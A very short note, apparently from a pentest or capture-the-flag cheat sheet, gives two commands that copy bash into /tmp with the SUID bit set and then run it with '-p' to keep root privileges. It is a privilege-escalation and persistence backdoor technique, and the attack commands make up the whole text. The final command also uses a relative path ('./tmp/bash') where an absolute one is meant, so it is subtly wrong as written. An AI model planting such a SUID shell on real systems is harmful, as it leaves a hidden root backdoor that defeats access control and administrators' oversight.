```sudo cp /bin/bash /tmp; chmod +s /tmp/bash```
Will create a bash shell with an SUID. We can priv esc with:
```./tmp/bash -p```